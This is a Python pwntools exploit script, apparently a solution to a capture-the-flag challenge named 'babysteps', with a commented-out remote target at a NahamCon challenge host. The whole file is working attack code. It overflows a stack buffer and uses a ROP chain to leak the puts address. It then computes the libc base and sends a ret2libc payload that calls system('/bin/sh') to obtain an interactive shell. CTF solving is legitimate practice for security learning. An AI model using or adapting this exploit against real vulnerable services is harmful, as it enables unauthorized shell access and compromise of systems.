from pwn import *

elf = ELF('./babysteps')
context.binary = elf
rop = ROP(elf)

offset = cyclic_find(0x61616168)

payload = cyclic(offset)
payload += p32(elf.plt.puts)
payload += p32(rop.ebx.address)
payload += p32(elf.got.puts)
payload += p32(elf.entrypoint)

print(payload)

with open('payload', 'wb+') as f:
	f.write(payload)

# with remote('challenge.nahamcon.com', 30234) as p:
with elf.process() as p:
	p.sendline(payload)

	_ = p.recvuntil(b'baby name?\n')

	leaks = p.recvline()
	leak_puts = unpack(leaks[:4])
	print("Leak puts @", hex(leak_puts))
	
	# From a first leak : 
	# libc = ELF('/opt/libc-database/db/libc6_2.15-0ubuntu10.23_i386.so')
	# libc = ELF('/opt/libc-database/db/libc6-i386_2.35-0ubuntu3_amd64.so')

	libc = elf.libc

	libc.address = leak_puts - libc.symbols.puts

	print("Libc @ ", hex(libc.address))
	print("System @ ", hex(libc.symbols.system))
	print("Bin/Sh  @ ", hex(next(libc.search(b'/bin/sh\x00'))))
	
	_ = p.recvuntil(b'baby name?\n')
	payload2 = cyclic(offset)
	payload2 += p32(libc.symbols.system)
	payload2 += p32(libc.symbols.exit)
	payload2 += p32(next(libc.search(b'/bin/sh')))
	p.sendline(payload2)
	p.interactive()